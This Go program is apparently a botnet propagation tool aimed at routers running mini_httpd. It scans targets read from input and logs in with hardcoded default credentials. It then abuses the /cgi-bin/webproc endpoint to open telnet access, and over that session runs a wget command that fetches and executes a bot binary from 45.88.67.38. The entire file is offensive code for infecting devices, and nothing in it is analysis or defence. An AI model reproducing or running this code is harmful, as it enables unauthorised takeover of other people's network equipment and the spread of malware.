package main

import (
	"net"
	"os"
	"time"
	"fmt"
	"strings"
	"encoding/base64"
	"sync"
	"crypto/tls"
	"bufio"
	"io"
	"bytes"
	"strconv"
)

var (
	port = os.Args[1]

	conf = &tls.Config{
		InsecureSkipVerify: true,
		MinVersion: tls.VersionTLS10,
	}

	creds = []string {
		"emcali:emcali", 
		"admin:admin", 
		"admin:1234", 
		"user:suser", 
		"user:1234", 
	}

	wg sync.WaitGroup

	timeout = 120 * time.Second

	processed uint64
	found uint64
	logins uint64
	successes uint64

	//telnetPort = "50444"
	telnetPort = "50111"
	payload = "cd /tmp; wget http://45.88.67.38/webp -O- >.sk; chmod 777 .sk; ./.sk"
)

func infectTelnet(target, user, pass string) {

	ip := strings.Split(target, ":")[0]
	conn, err := net.DialTimeout("tcp", ip + ":" + telnetPort, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	conn.SetDeadline(time.Now().Add(timeout))

	fmt.Printf("Connected to %s:%s %s:%s\n", target, telnetPort, user, pass)

	for {
		buff := make([]byte, 1024)

		len, err := conn.Read(buff)

		if len <= 0 {
			return
		}

		if err != nil {
			return
		}

		if strings.Contains(string(buff), ":") {
			conn.Write([]byte(user + "\r\n"))
			break
		}
	}

	conn.SetDeadline(time.Now().Add(timeout))

	for {
		buff := make([]byte, 1024)

		len, err := conn.Read(buff)

		if len <= 0 {
			return
		}

		if err != nil {
			return
		}

		if strings.Contains(string(buff), ":") {
			conn.Write([]byte(pass + "\r\n"))
			break
		}
	}

	conn.SetDeadline(time.Now().Add(timeout))

	for {
		buff := make([]byte, 1024)

		len, err := conn.Read(buff)

		if len <= 0 {
			return
		}

		if err != nil {
			return
		}

		if strings.Contains(string(buff), "ailed") || strings.Contains(string(buff), "ncorrect") {
			return
		}

		if strings.Contains(string(buff), ">") || strings.Contains(string(buff), "uccess") {
			fmt.Printf("Logged in to telnet on %s %s:%s\n", target, user, pass)
			conn.Write([]byte("sh\r\nshell\r\nenable\r\n"))
			break
		}
	}

	conn.SetDeadline(time.Now().Add(timeout))

	for {
		buff := make([]byte, 1024)

		len, err := conn.Read(buff)

		if len <= 0 {
			return
		}

		if err != nil {
			return
		}

		if strings.Contains(string(buff), "$") || strings.Contains(string(buff), "~") || strings.Contains(string(buff), "#") {
			conn.Write([]byte(payload + "\r\n"))
			break
		}
	}

	conn.SetDeadline(time.Now().Add(timeout))

	for {
		buff := make([]byte, 1024)

		len, err := conn.Read(buff)

		if len <= 0 {
			return
		}

		if err != nil {
			return
		}

		if strings.Contains(string(buff), "snow slide") {
			fmt.Printf("Bot successfully deployed via wget! %s %s:%s\n", target, user, pass)

			successes++
			return
		}
	}
}

func enableTelnet(target, user string) bool {

	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)

	if err != nil {
		return false
	}

	defer conn.Close()

	wan_config := base64.StdEncoding.EncodeToString([]byte("SELECT_ConnList=InternetGatewayDevice.WANDevice.1.WANConnectionDevice.4.WANPPPConnection.1|Enable_0=true|Enable_WANIP_0=200.29.103.3|Enable_WANMask_0=255.255.255.255|Enable_WANPort_0=2121|Enable_1=false|Enable_WANIP_1=0.0.0.0|Enable_WANMask_1=0.0.0.0|Enable_WANPort_1=80|Enable_2=true|Enable_WANIP_2=0.0.0.0|Enable_WANMask_2=0.0.0.0|Enable_WANPort_2=0|Enable_3=true|Enable_WANIP_3=0.0.0.0|Enable_WANMask_3=0.0.0.0|Enable_WANPort_3=" + telnetPort + "|Enable_4=false|Enable_WANIP_4=0.0.0.0|Enable_WANMask_4=0.0.0.0|Enable_WANPort_4=69|Enable_5=true|Enable_WANIP_5=0.0.0.0|Enable_WANMask_5=0.0.0.0|Enable_WANPort_5=443"))

	data := "%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.1.Enable=1&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.1.ExternalPort=2121&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.1.SrcIP=200.29.103.3&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.1.SrcMask=255.255.255.255&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.2.Enable=0&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.2.ExternalPort=80&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.2.SrcIP=0.0.0.0&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.2.SrcMask=0.0.0.0&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.3.Enable=1&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.3.ExternalPort=0&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.3.SrcIP=0.0.0.0&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.3.SrcMask=0.0.0.0&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.4.Enable=1&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.4.ExternalPort=" + telnetPort + "&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.4.SrcIP=0.0.0.0&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.4.SrcMask=0.0.0.0&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.5.Enable=0&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.5.ExternalPort=69&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.5.SrcIP=0.0.0.0&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.5.SrcMask=0.0.0.0&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.6.Enable=1&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.6.ExternalPort=443&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.6.SrcIP=0.0.0.0&%3AInternetGatewayDevice.X_TWSZ-COM_ACL.RACL.2.Service.6.SrcMask=0.0.0.0&var%3Amenu=maintenance&var%3Apage=accessctrl&var%3Asubpage=services&getpage=html%2Findex.html&errorpage=html%2Findex.html&obj-action=set&var%3ApathIndex=0&var%3AselectedIndex=1&var%3Aerrorpage=services&var%3ACacheLastData=" + wan_config
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /cgi-bin/webproc HTTP/1.1\r\nReferer: " + target + "/cgi-bin/webproc\r\nContent-Length: " + cntLen + "\r\nCookie: sessionid=2019389d; language=en_us; sys_UserName=" + user + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "Location: /cgi-bin/webproc")
}

func loginDevice(target, user, pass string) bool {

	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)

	if err != nil {
		return false
	}

	defer conn.Close()
	
	data := "getpage=html%2Findex.html&errorpage=html%2Fmain.html&var%3Amenu=setup&var%3Apage=wizard&obj-action=auth&%3Ausername=" + user + "&%3Apassword=" + pass + "&%3Aaction=login&%3Asessionid=2019389d"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /cgi-bin/webproc HTTP/1.1\r\nContent-Length: " + cntLen + "\r\nCookie: sessionid=2019389d; language=en_us; sys_UserName=" + user + "\r\nUser-Agent: Mozilla\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "2019389d") && strings.Contains(buff.String(), "Location: /cgi-bin/webproc?getpage=html/index.html")
}

func findDevice(target string) bool {

	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nUser-Agent: Mozilla\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "Server: mini_httpd/1.19 19dec2003")
}

func exploitDevice(target string) {

	processed++

	wg.Add(1)
	defer wg.Done()

	if !findDevice(target) {
		return
	}

	found++

	for _, cred := range creds {

		user := strings.Split(cred, ":")[0]
		pass := strings.Split(cred, ":")[1]

		if loginDevice(target, user, pass) {

			logins++

			fmt.Printf("[EMCALI] logged in to %s %s:%s\n", target, user, pass)

			if !enableTelnet(target, user) {
				return
			}

			time.Sleep(5 * time.Second)

			infectTelnet(target, user, pass)
			return
		}
	}
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d | Found: %d | Logins: %d | Success: %d\n", processed, found, logins, successes)
		time.Sleep(1 * time.Second)
	}
}

func main() {

	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()

	for scanner.Scan() {

		if port == "manual" {
			go exploitDevice(scanner.Text())
		} else {
			go exploitDevice(scanner.Text() + ":" + port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}
